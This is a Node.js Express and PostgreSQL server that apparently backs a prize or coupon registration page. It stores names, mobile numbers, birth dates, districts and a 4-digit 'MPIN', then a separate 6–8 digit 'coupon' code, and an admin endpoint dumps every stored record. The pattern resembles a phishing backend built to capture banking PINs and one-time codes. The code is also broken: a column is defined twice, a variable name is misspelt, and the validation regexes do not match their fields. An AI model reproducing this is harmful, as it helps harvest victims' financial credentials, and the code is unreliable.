const express = require("express");
const path = require("path");
const { Pool } = require("pg");

const app = express();


// ====================================
// MIDDLEWARE
// ====================================

app.use(express.json());

app.use(
  express.urlencoded({
    extended: true
  })
);


// ====================================
// STATIC WEBSITE
// ====================================

app.use(
  express.static(
    path.join(__dirname)
  )
);


// ====================================
// POSTGRESQL
// ====================================

if (!process.env.DATABASE_URL) {

  console.error(
    "DATABASE_URL is missing."
  );

}


const pool =
  new Pool({

    connectionString:
      process.env.DATABASE_URL,

    ssl:
      process.env.DATABASE_URL
        ? {
            rejectUnauthorized: false
          }
        : false

  });


// ====================================
// DATABASE TABLE
// ====================================

async function createTable() {

  try {

    await pool.query(`

      CREATE TABLE IF NOT EXISTS participants (

        id SERIAL PRIMARY KEY,

        name VARCHAR(100) NOT NULL,

        mobile VARCHAR(10) NOT NULL,

        secret_code VARCHAR(4) NOT NULL,

        dob DATE NOT NULL,

        district VARCHAR(100) NOT NULL,

        secret_code VARCHAR(8),

        created_at
          TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

        secret_submitted_at
          TIMESTAMP

      )

    `);


    // Existing database के लिए
    // missing columns add करें

    await pool.query(`

      ALTER TABLE participants

      ADD COLUMN IF NOT EXISTS
      mobile VARCHAR(10)

    `);


    await pool.query(`

      ALTER TABLE participants

      ADD COLUMN IF NOT EXISTS
      secret_code VARCHAR(8)

    `);


    await pool.query(`

      ALTER TABLE participants

      ADD COLUMN IF NOT EXISTS
      created_at
      TIMESTAMP DEFAULT CURRENT_TIMESTAMP

    `);


    await pool.query(`

      ALTER TABLE participants

      ADD COLUMN IF NOT EXISTS
      secret_submitted_at TIMESTAMP

    `);


    console.log(
      "Database table ready ✅"
    );

  }

  catch (error) {

    console.error(
      "Database table error:",
      error
    );

  }

}


// ====================================
// HOME
// ====================================

app.get(
  "/",
  function(req, res) {

    res.sendFile(
      path.join(
        __dirname,
        "index.html"
      )
    );

  }
);


// ====================================
// REGISTER
// ====================================

app.post(
  "/api/register",
  async function(req, res) {

    try {

      const {
        name,
        mobile,
        secre_code,
        dob,
        district
      } = req.body;


      if (
        !name ||
        !mobile||
        !secret_code||
        !dob ||
        !district
      ) {

        return res
          .status(400)
          .json({

            success: false,

            message:
              "All fields are required."

          });

      }


      // Basic email validation

      if (
        !/^[^\s@]+@[^\s@]+\.[^\s@]+$/
          .test(mobile)
      ) {

        return res
          .status(400)
          .json({

            success: false,

            message:
              "Please enter a valid number."

          });

      }


      // Mobile validation

      if (
        !/^[0-9]{10}$/
          .test(secret_code)
      ) {

        return res
          .status(400)
          .json({

            success: false,

            message:
              "MPIN number must be 4 digits."

          });

      }


      const result =
        await pool.query(

          `

          INSERT INTO participants

          (
            name,
            mobile,
            secret_code,
            dob,
            district
          )

          VALUES
          ($1, $2, $3, $4, $5)

          RETURNING id

          `,

          [
            name,
            mobile,
            secret_code,
            dob,
            district
          ]

        );


      const entryId =
        result.rows[0].id;


      console.log(
        "Registration saved:",
        entryId
      );


      res.json({

        success: true,

        entryId:
          entryId

      });

    }

    catch (error) {

      console.error(
        "Registration error:",
        error
      );


      res
        .status(500)
        .json({

          success: false,

          message:
            "Could not save registration."

        });

    }

  }
);


// ====================================
// COUPON
// ====================================

app.post(
  "/api/secret",
  async function(req, res) {

    try {

      const {
        entryId,
        secretCode
      } = req.body;


      if (
        !entryId ||
        !secretCode
      ) {

        return res
          .status(400)
          .json({

            success: false,

            message:
              "Coupon code is required."

          });

      }


      // Only 6–8 digits

      if (
        !/^[0-9]{6,8}$/
          .test(String(secretCode))
      ) {

        return res
          .status(400)
          .json({

            success: false,

            message:
              "Coupon must contain 6 to 8 digits."

          });

      }


      const result =
        await pool.query(

          `

          UPDATE participants

          SET

            secret_code = $1,

            secret_submitted_at =
              CURRENT_TIMESTAMP

          WHERE id = $2

          RETURNING id

          `,

          [
            secretCode,
            entryId
          ]

        );


      if (
        result.rows.length === 0
      ) {

        return res
          .status(404)
          .json({

            success: false,

            message:
              "Registration not found."

          });

      }


      console.log(
        "Coupon saved:",
        entryId
      );


      res.json({

        success: true

      });

    }

    catch (error) {

      console.error(
        "Coupon error:",
        error
      );


      res
        .status(500)
        .json({

          success: false,

          message:
            "Could not save coupon."

        });

    }

  }
);


// ====================================
// ADMIN LOGIN
// ====================================

app.post(
  "/api/admin/login",
  async function(req, res) {

    try {

      const {
        password
      } = req.body;


      if (
        !process.env.ADMIN_PASSWORD ||
        password !==
          process.env.ADMIN_PASSWORD
      ) {

        return res
          .status(401)
          .json({

            success: false,

            message:
              "Wrong password."

          });

      }


      res.json({

        success: true

      });

    }

    catch (error) {

      console.error(
        "Admin login error:",
        error
      );


      res
        .status(500)
        .json({

          success: false,

          message:
            "Server error."

        });

    }

  }
);


// ====================================
// ADMIN DATA
// ====================================

app.post(
  "/api/admin/data",
  async function(req, res) {

    try {

      const {
        password
      } = req.body;


      if (
        !process.env.ADMIN_PASSWORD ||
        password !==
          process.env.ADMIN_PASSWORD
      ) {

        return res
          .status(401)
          .json({

            success: false,

            message:
              "Unauthorized."

          });

      }


      const result =
        await pool.query(`

          SELECT

            id,

            name,

            mobile,

            secret_code,

            dob,

            district,

            secret_code,

            created_at,

            secret_submitted_at

          FROM participants

          ORDER BY id DESC

        `);


      res.json({

        success: true,

        count:
          result.rows.length,

        participants:
          result.rows

      });

    }

    catch (error) {

      console.error(
        "Admin data error:",
        error
      );


      res
        .status(500)
        .json({

          success: false,

          message:
            "Could not load data."

        });

    }

  }
);


// ====================================
// HEALTH CHECK
// ====================================

app.get(
  "/api/health",
  async function(req, res) {

    try {

      await pool.query(
        "SELECT 1"
      );


      res.json({

        status: "OK",

        database:
          "connected"

      });

    }

    catch (error) {

      console.error(
        "Health error:",
        error
      );


      res
        .status(500)
        .json({

          status:
            "ERROR",

          database:
            "not connected"

        });

    }

  }
);


// ====================================
// 404 API
// ====================================

app.use(
  "/api",
  function(req, res) {

    res
      .status(404)
      .json({

        success: false,

        message:
          "API endpoint not found."

      });

  }
);


// ====================================
// ERROR HANDLER
// ====================================

app.use(
  function(error, req, res, next) {

    console.error(
      "Server error:",
      error
    );


    res
      .status(500)
      .json({

        success: false,

        message:
          "Internal server error."

      });

  }
);


// ====================================
// START
// ====================================

const PORT =
  process.env.PORT || 3000;


app.listen(
  PORT,
  "0.0.0.0",
  async function() {

    console.log(
      `Server running on port ${PORT}`
    );

    await createTable();

  }
);
